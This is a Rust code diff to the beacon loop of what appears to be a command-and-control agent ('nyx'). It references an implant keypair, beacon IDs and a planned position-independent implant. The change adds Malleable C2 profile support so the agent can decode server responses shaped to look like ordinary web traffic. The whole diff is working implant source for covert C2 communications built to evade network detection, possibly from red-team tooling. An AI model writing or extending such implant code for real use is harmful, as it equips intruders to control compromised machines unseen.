@@ -9,6 +9,7 @@ use std::io::Read;
 use std::path::{Path, PathBuf};
 use std::time::Duration;
 
+use nyx_profile::ServerEnvelope;
 use nyx_protocol::{
     encode_frame, open_frame, parse_frame, wire::Writer, Command, ImplantKeypair, Response,
     SessionInfo, Task, TaskResponse,
@@ -27,6 +28,11 @@ pub struct Config {
     /// Beacon endpoint path — `/beacon`, or the Malleable C2 profile's http-post
     /// `uri`. The agent POSTs the encrypted frame to `{server_url}{beacon_uri}`.
     pub beacon_uri: String,
+    /// Optional Malleable C2 profile. When set, the agent inverts the profile's
+    /// `http-post server.output` transform chain on each beacon response so it
+    /// can recover the encrypted frame the server shaped. Mirrors what the PIC
+    /// implant will do — keeps the dev loop green under a profile envelope.
+    pub profile: Option<nyx_profile::Profile>,
 }
 
 pub fn run(cfg: Config) -> anyhow::Result<()> {
@@ -34,6 +40,16 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
     let key = kp.session_key(&cfg.server_pub);
     let pubkey = kp.public_bytes();
     let beacon_id: u32 = rand::random();
+
+    // Resolve the server-side response envelope (the transform chain the server
+    // applies to http-post responses). When the agent has the profile it must
+    // invert these steps to recover the raw encrypted frame; without a profile
+    // the envelope is a no-op (the server returns a raw frame too).
+    let server_env: ServerEnvelope = cfg
+        .profile
+        .as_ref()
+        .map(nyx_profile::post_server_envelope)
+        .unwrap_or_default();
 
     let info = SessionInfo {
         beacon_id,
@@ -91,7 +107,10 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
         let mut body = Vec::new();
         resp.into_reader().read_to_end(&mut body)?;
 
-        let raw = match parse_frame(&body) {
+        // Invert the profile's server.output envelope to recover the raw frame.
+        let frame_bytes = unwrap_server_envelope(&server_env, &body);
+
+        let raw = match parse_frame(&frame_bytes) {
             Ok(r) => r,
             Err(e) => {
                 tracing::warn!(?e, "bad reply frame");
@@ -120,6 +139,25 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                     response,
                 });
             }
+        }
+    }
+}
+
+/// Recover the raw encrypted frame from a server response body. With no
+/// envelope (or a `print` terminator with no transform steps) the body *is* the
+/// frame. Otherwise invert the transform chain. For a `header`/`parameter`
+/// terminator the transformed bytes ride in a header, not the body — the dev
+/// agent doesn't speak that variant (the PIC implant will), so this returns the
+/// body unchanged and the frame parse will fail loudly, surfacing the mismatch.
+fn unwrap_server_envelope(env: &ServerEnvelope, body: &[u8]) -> Vec<u8> {
+    if env.steps.is_empty() {
+        return body.to_vec();
+    }
+    match nyx_profile::decode(&env.steps, body) {
+        Ok(raw) => raw,
+        Err(e) => {
+            tracing::warn!(?e, "server envelope decode failed; trying raw frame");
+            body.to_vec()
         }
     }
 }
